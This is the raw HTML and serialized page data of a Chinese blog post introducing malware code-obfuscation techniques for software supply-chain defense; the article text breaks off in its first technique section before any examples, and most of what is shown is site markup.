53.76L59.136 403.157333 1.877333 579.712a39.424 39.424 0 0 0 14.122667 43.648L512 983.637333l496-360.234666a39.253333 39.253333 0 0 0 14.08-43.690667"></path></svg></a><a class="text-sm !text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://gitee.com/lmj2001"><span class="sr-only">gitee</span><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6" width="200" height="200"><path d="M512 992C246.895625 992 32 777.104375 32 512S246.895625 32 512 32s480 214.895625 480 480-214.895625 480-480 480z m242.9521875-533.3278125h-272.56875a23.7121875 23.7121875 0 0 0-23.71125 23.7121875l-0.024375 59.255625c0 13.08 10.6078125 23.7121875 23.6878125 23.7121875h165.96c13.104375 0 23.7121875 10.6078125 23.7121875 23.6878125v11.855625a71.1121875 71.1121875 0 0 1-71.1121875 71.1121875h-225.215625a23.7121875 23.7121875 0 0 1-23.6878125-23.7121875V423.1278125a71.1121875 71.1121875 0 0 1 71.0878125-71.1121875h331.824375a23.7121875 23.7121875 0 0 0 23.6878125-23.71125l0.0721875-59.2565625a23.7121875 23.7121875 0 0 0-23.68875-23.7121875H423.08a177.76875 177.76875 0 0 0-177.76875 177.7921875V754.953125c0 13.1034375 10.60875 23.7121875 23.713125 23.7121875h349.63125a159.984375 159.984375 0 0 0 159.984375-159.984375V482.36a23.7121875 23.7121875 0 0 0-23.7121875-23.6878125z"></path></svg></a></div><div class="mb-2 flex space-x-2 text-sm text-gray-500 dark:text-gray-400"><div>MainJayLai</div><div> • </div><div>© 2025</div><div> • </div><a href="/">MainJayLai Blog</a></div></div></footer></div></section><script src="/_next/static/chunks/webpack-8506c16620cf39fb.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/36966cca54120369-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/c890694439b2475b.css\",\"style\"]\n3:HL[\"/_next/static/css/1ea5cf861ee12a80.css\",\"style\"]\n4:HL[\"/_next/static/css/a9b9096fa657c0d0.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"5:I[5751,[],\"\"]\n8:I[9275,[],\"\"]\na:I[1343,[],\"\"]\nb:I[8700,[\"599\",\"static/chunks/ebde5ed1-51545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"ThemeProviders\"]\nc:I[4080,[\"599\",\"static/chunks/ebde5ed1-51545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"\"]\nd:I[9032,[\"599\",\"static/chunks/ebde5ed1-51545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"KBarSearchProvider\"]\ne:I[231,[\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"797\",\"static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js\"],\"\"]\nf:I[8173,[\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"797\",\"static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js\"],\"Image\"]\n10:I[509,[\"599\",\"static/chunks/ebde5ed1-51545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"KBarButton\"]\n11:I[1398,[\"599\",\"static/chunks/ebde5ed1-51545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"default\"]\n12:I[7606,[\"599\",\"static/chunks/ebde5ed1-51545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"default\"]\n13:I[7510,[\"599\",\"static/chunks/ebde5ed1-5"])</script><script>self.__next_f.push([1,"1545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"default\"]\n14:I[8976,[\"599\",\"static/chunks/ebde5ed1-51545511fe0d5050.js\",\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"850\",\"static/chunks/850-ecf153581cc02044.js\",\"185\",\"static/chunks/app/layout-54bebb918ae7f176.js\"],\"default\"]\n16:I[6130,[],\"\"]\n9:[\"slug\",\"security/demystifying-obfuscation-techniques-in-malware\",\"c\"]\n17:[]\n"])</script><script>self.__next_f.push([1,"0:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/c890694439b2475b.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/1ea5cf861ee12a80.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],[\"$\",\"$L5\",null,{\"buildId\":\"AO1lBacSEqBfLSl9iFzzQ\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/blog/security/demystifying-obfuscation-techniques-in-malware\",\"initialTree\":[\"\",{\"children\":[\"blog\",{\"children\":[[\"slug\",\"security/demystifying-obfuscation-techniques-in-malware\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"security\\\",\\\"demystifying-obfuscation-techniques-in-malware\\\"]}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"blog\",{\"children\":[[\"slug\",\"security/demystifying-obfuscation-techniques-in-malware\",\"c\"],{\"children\":[\"__PAGE__\",{},[[\"$L6\",\"$L7\"],null],null]},[\"$\",\"$L8\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"blog\",\"children\",\"$9\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$La\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/a9b9096fa657c0d0.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]]}],null]},[\"$\",\"$L8\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"blog\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$La\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":null}],null]},[[\"$\",\"html\",null,{\"lang\":\"en-us\",\"className\":\"__variable_dd5b2f scroll-smooth\",\"suppressHydrationWarning\":true,\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"icon\",\"type\":\"image/png\",\"href\":\"https://mainjaylai.github.io/favicon.png\"}],[\"$\",\"link\",null,{\"rel\":\"manifest\",\"href\":\"/static/favicons/manifest.json\"}],[\"$\",\"meta\",null,{\"name\":\"msapplication-TileColor\",\"content\":\"#000000\"}],[\"$\",\"link\",null,{\"href\":\"https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200..900\u0026display=swap\",\"rel\":\"stylesheet\"}],[\"$\",\"link\",null,{\"href\":\"https://fonts.googleapis.com/css2?family=ZCOOL+KuaiLe\u0026family=ZCOOL+QingKe+HuangYou\u0026family=ZCOOL+XiaoWei\u0026display=swap\",\"rel\":\"stylesheet\"}],[\"$\",\"script\",null,{\"src\":\"https://us.umami.is/script.js\",\"async\":true}],[\"$\",\"meta\",null,{\"name\":\"theme-color\",\"media\":\"(prefers-color-scheme: light)\",\"content\":\"#fff\"}],[\"$\",\"meta\",null,{\"name\":\"theme-color\",\"media\":\"(prefers-color-scheme: dark)\",\"content\":\"#000\"}],[\"$\",\"meta\",null,{\"name\":\"referrer\",\"content\":\"no-referrer\"}],[\"$\",\"script\",null,{\"src\":\"https://cdn.jsdelivr.net/gh/ashishagarwal2023/freegptjs@1.0.2/src/freegpt.min.js\"}],[\"$\",\"link\",null,{\"rel\":\"alternate\",\"type\":\"application/rss+xml\",\"href\":\"/feed.xml\"}]]}],[\"$\",\"body\",null,{\"className\":\"bg-white pl-[calc(100vw-100%)] text-black antialiased dark:bg-gray-950 dark:text-white\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"$Lb\",null,{\"children\":[[\"$undefined\",\"$undefined\",\"$undefined\",[\"$\",\"$Lc\",null,{\"async\":true,\"defer\":true,\"data-website-id\":\"bbe21cb3-3de3-4ba7-b6de-453053bc6ae8\",\"src\":\"https://us.umami.is/script.js\"}],\"$undefined\",\"$undefined\"],[\"$\",\"section\",null,{\"className\":\"mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex h-screen flex-col justify-between font-sans\",\"children\":[[\"$\",\"$Ld\",null,{\"kbarConfig\":{\"searchDocumentsPath\":\"/search.json\"},\"children\":[[\"$\",\"header\",null,{\"className\":\"flex items-center justify-between py-5\",\"children\":[[\"$\",\"div\",null,{\"children\":[\"$\",\"$Le\",null,{\"href\":\"/\",\"aria-label\":\"Blog\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex items-center justify-between\",\"children\":[[\"$\",\"div\",null,{\"className\":\"mr-3\",\"children\":[\"$\",\"$Lf\",null,{\"src\":\"https://mainjaylai.github.io/favicon.png\",\"width\":44,\"height\":44,\"alt\":\"logo\"}]}],[\"$\",\"div\",null,{\"className\":\"hidden h-[44px] text-center text-3xl font-semibold leading-10 sm:block\",\"children\":\"Blog\"}]]}]}]}],[\"$\",\"div\",null,{\"className\":\"flex items-center space-x-4 leading-5 sm:space-x-6\",\"children\":[[[\"$\",\"$Le\",null,{\"href\":\"/blog\",\"className\":\"navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block\",\"children\":\"Blog\"}],[\"$\",\"$Le\",null,{\"href\":\"/tags\",\"className\":\"navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block\",\"children\":\"Tags\"}],[\"$\",\"a\",null,{\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"https://mainjaylai.github.io\",\"className\":\"navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block\",\"children\":\"About\"}]],[\"$\",\"$L10\",null,{\"aria-label\":\"Search\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"fill\":\"none\",\"viewBox\":\"0 0 24 24\",\"strokeWidth\":1.5,\"stroke\":\"currentColor\",\"className\":\"h-6 w-6 text-gray-900 dark:text-gray-100\",\"children\":[\"$\",\"path\",null,{\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"d\":\"M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z\"}]}]}],[\"$\",\"$L11\",null,{}],[\"$\",\"$L12\",null,{}],[\"$\",\"$L13\",null,{}],[\"$\",\"$L14\",null,{}]]}]]}],[\"$\",\"main\",null,{\"className\":\"mb-auto\",\"children\":[\"$\",\"$L8\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$La\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"div\",null,{\"className\":\"flex flex-col items-start justify-start md:mt-24 md:flex-row md:items-center md:justify-center md:space-x-6\",\"children\":[[\"$\",\"div\",null,{\"className\":\"space-x-2 pb-8 pt-6 md:space-y-5\",\"children\":[\"$\",\"h1\",null,{\"className\":\"text-6xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 md:border-r-2 md:px-6 md:text-8xl md:leading-14\",\"children\":\"404\"}]}],[\"$\",\"div\",null,{\"className\":\"max-w-md\",\"children\":[[\"$\",\"p\",null,{\"className\":\"mb-4 text-xl font-bold leading-normal md:text-2xl\",\"children\":\"Sorry we couldn't find this page.\"}],[\"$\",\"p\",null,{\"className\":\"mb-8\",\"children\":\"But dont worry, you can find plenty of other things on our homepage.\"}],[\"$\",\"$Le\",null,{\"href\":\"/\",\"className\":\"focus:shadow-outline-blue inline rounded-lg border border-transparent bg-blue-600 px-4 py-2 text-sm font-medium leading-5 text-white shadow transition-colors duration-150 hover:bg-blue-700 focus:outline-none dark:hover:bg-blue-500\",\"children\":\"Back to homepage\"}]]}]]}],\"notFoundStyles\":[],\"styles\":null}]}]]}],[\"$\",\"footer\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"mt-16 flex flex-col items-center\",\"children\":[[\"$\",\"div\",null,{\"className\":\"mb-3 flex space-x-4\",\"children\":[[\"$\",\"a\",null,{\"className\":\"text-sm !text-gray-500 transition hover:text-gray-600\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"mailto:mainjaylai@outlook.com\",\"children\":[[\"$\",\"span\",null,{\"className\":\"sr-only\",\"children\":\"mail\"}],[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"viewBox\":\"0 0 20 20\",\"className\":\"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z\"}],[\"$\",\"path\",null,{\"d\":\"M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z\"}]]}]]}],[\"$\",\"a\",null,{\"className\":\"text-sm !text-gray-500 transition hover:text-gray-600\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"https://github.com/mainjaylai\",\"children\":[[\"$\",\"span\",null,{\"className\":\"sr-only\",\"children\":\"github\"}],[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"viewBox\":\"0 0 24 24\",\"className\":\"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6\",\"children\":[\"$\",\"path\",null,{\"d\":\"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12\"}]}]]}],[\"$\",\"a\",null,{\"className\":\"text-sm !text-gray-500 transition hover:text-gray-600\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"https://gitlab.com/JayMain\",\"children\":[[\"$\",\"span\",null,{\"className\":\"sr-only\",\"children\":\"gitlab\"}],[\"$\",\"svg\",null,{\"viewBox\":\"0 0 1024 1024\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"className\":\"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6\",\"width\":\"200\",\"height\":\"200\",\"children\":[\"$\",\"path\",null,{\"d\":\"M1022.08 579.712l-57.258667-176.426667-113.664-349.397333a19.413333 19.413333 0 0 0-36.992 0L700.501333 403.2H323.498667L209.877333 53.888C204.074667 35.84 178.56 35.84 172.8 53.76L59.136 403.157333 1.877333 579.712a39.424 39.424 0 0 0 14.122667 43.648L512 983.637333l496-360.234666a39.253333 39.253333 0 0 0 14.08-43.690667\"}]}]]}],[\"$\",\"a\",null,{\"className\":\"text-sm !text-gray-500 transition hover:text-gray-600\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"https://gitee.com/lmj2001\",\"children\":[[\"$\",\"span\",null,{\"className\":\"sr-only\",\"children\":\"gitee\"}],[\"$\",\"svg\",null,{\"viewBox\":\"0 0 1024 1024\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"className\":\"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6\",\"width\":\"200\",\"height\":\"200\",\"children\":[\"$\",\"path\",null,{\"d\":\"M512 992C246.895625 992 32 777.104375 32 512S246.895625 32 512 32s480 214.895625 480 480-214.895625 480-480 480z m242.9521875-533.3278125h-272.56875a23.7121875 23.7121875 0 0 0-23.71125 23.7121875l-0.024375 59.255625c0 13.08 10.6078125 23.7121875 23.6878125 23.7121875h165.96c13.104375 0 23.7121875 10.6078125 23.7121875 23.6878125v11.855625a71.1121875 71.1121875 0 0 1-71.1121875 71.1121875h-225.215625a23.7121875 23.7121875 0 0 1-23.6878125-23.7121875V423.1278125a71.1121875 71.1121875 0 0 1 71.0878125-71.1121875h331.824375a23.7121875 23.7121875 0 0 0 23.6878125-23.71125l0.0721875-59.2565625a23.7121875 23.7121875 0 0 0-23.68875-23.7121875H423.08a177.76875 177.76875 0 0 0-177.76875 177.7921875V754.953125c0 13.1034375 10.60875 23.7121875 23.713125 23.7121875h349.63125a159.984375 159.984375 0 0 0 159.984375-159.984375V482.36a23.7121875 23.7121875 0 0 0-23.7121875-23.6878125z\"}]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"mb-2 flex space-x-2 text-sm text-gray-500 dark:text-gray-400\",\"children\":[[\"$\",\"div\",null,{\"children\":\"MainJayLai\"}],[\"$\",\"div\",null,{\"children\":\" • \"}],[\"$\",\"div\",null,{\"children\":\"© 2025\"}],[\"$\",\"div\",null,{\"children\":\" • \"}],[\"$\",\"$Le\",null,{\"href\":\"/\",\"children\":\"MainJayLai Blog\"}]]}]]}]}]]}]}]]}]}]]}],null],null],\"couldBeIntercepted\":false,\"initialHead\":[false,\"$L15\"],\"globalErrorComponent\":\"$16\",\"missingSlots\":\"$W17\"}]]\n"])</script><script>self.__next_f.push([1,"18:I[4347,[\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"797\",\"static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js\"],\"default\"]\n19:I[408,[\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"797\",\"static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js\"],\"default\"]\n1a:I[9629,[\"231\",\"static/chunks/231-34a6a67d2da26855.js\",\"827\",\"static/chunks/827-69594f61c16b8a9c.js\",\"797\",\"static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js\"],\"default\"]\n"])</script><script>self.__next_f.push([1,"7:[[\"$\",\"script\",null,{\"type\":\"application/ld+json\",\"dangerouslySetInnerHTML\":{\"__html\":\"{\\\"@context\\\":\\\"https://schema.org\\\",\\\"@type\\\":\\\"BlogPosting\\\",\\\"headline\\\":\\\"揭秘恶意软件中的代码混淆把戏：深入原理与实例\\\",\\\"datePublished\\\":\\\"2025-05-09T00:00:00.000Z\\\",\\\"dateModified\\\":\\\"2025-05-09T00:00:00.000Z\\\",\\\"description\\\":\\\"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。\\\",\\\"image\\\":\\\"https://pngimg.com/uploads/github/github_PNG80.png\\\",\\\"url\\\":\\\"https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware\\\",\\\"author\\\":[{\\\"@type\\\":\\\"Person\\\",\\\"name\\\":\\\"mainJayLai\\\"}]}\"}}],[\"$\",\"section\",null,{\"className\":\"mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0\",\"children\":[[\"$\",\"$L18\",null,{}],[\"$\",\"article\",null,{\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"space-y-1 border-b border-gray-200 pb-10 text-center dark:border-gray-700\",\"children\":[[\"$\",\"div\",null,{\"className\":\"beautiful-chinese-title\",\"children\":[\"$\",\"h1\",null,{\"className\":\"text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14\",\"children\":\"揭秘恶意软件中的代码混淆把戏：深入原理与实例\"}]}],[\"$\",\"dl\",null,{\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"dt\",null,{\"className\":\"sr-only\",\"children\":\"Published on\"}],[\"$\",\"dd\",null,{\"className\":\"text-base font-medium leading-6 text-gray-500 dark:text-gray-400\",\"children\":[\"$\",\"time\",null,{\"dateTime\":\"2025-05-09T00:00:00.000Z\",\"children\":\"May 9, 2025\"}]}]]}]}]]}]}],[\"$\",\"div\",null,{\"className\":\"grid-rows-[auto_1fr] divide-y divide-gray-200 pb-8 dark:divide-gray-700 xl:divide-y-0\",\"children\":[[\"$\",\"div\",null,{\"className\":\"divide-y divide-gray-200 dark:divide-gray-700 xl:col-span-3 xl:row-span-2 xl:pb-0\",\"children\":[\"$\",\"div\",null,{\"className\":\"beautiful-chinese-content prose max-w-none pb-8 pt-10 dark:prose-invert\",\"children\":[[\"$\",\"h2\",null,{\"className\":\"content-header\",\"id\":\"引言看不见的威胁\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#引言看不见的威胁\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"引言：看不见的威胁\"]}],[\"$\",\"p\",null,{\"children\":\"“恶意软件包就在我们眼前，但直到为时已晚我们才发现它。” 这句话点出了一个残酷的现实：攻击者越来越依赖代码混淆（Obfuscation）技术，将恶意负载巧妙地伪装起来，试图绕过安全防御系统和代码审查人员的火眼金睛。理解这些跨越不同生态系统（如 npm、PyPI、Maven 和 Go 模块）的混淆技术，对于旨在保护其软件供应链的开发人员和安全团队至关重要。\"}],[\"$\",\"h2\",null,{\"className\":\"content-header\",\"id\":\"什么是代码混淆\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#什么是代码混淆\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"什么是代码混淆？\"]}],[\"$\",\"p\",null,{\"children\":[\"代码混淆是一种故意将清晰易读的源代码转换成难以理解、复杂甚至看似毫无意义的指令集的过程。在合法场景下，开发者可能会使用混淆技术来保护知识产权，或者通过代码压缩（Minification）来减小文件体积。然而，不幸的是，恶意行为者普遍滥用这种策略，以逃避自动化安全工具和人工审查流程的检测。其核心目标是：\",[\"$\",\"strong\",null,{\"children\":\"增加分析难度，延长被发现的时间，甚至完全躲避检测。\"}]]}],[\"$\",\"h2\",null,{\"className\":\"content-header\",\"id\":\"常见的代码混淆技术及其原理剖析\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#常见的代码混淆技术及其原理剖析\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"常见的代码混淆技术及其原理剖析\"]}],[\"$\",\"p\",null,{\"children\":\"让我们深入探讨一些在各种生态系统中广泛应用的混淆方法，并详细解释其背后的原理。\"}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"1-字符串编码与字符操纵-encoded-strings--character-manipulation\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#1-字符串编码与字符操纵-encoded-strings--character-manipulation\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"1. 字符串编码与字符操纵 (Encoded Strings \u0026 Character Manipulation)\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"攻击者为何青睐此法：\"}],\" 编码能够让攻击者隐藏关键的 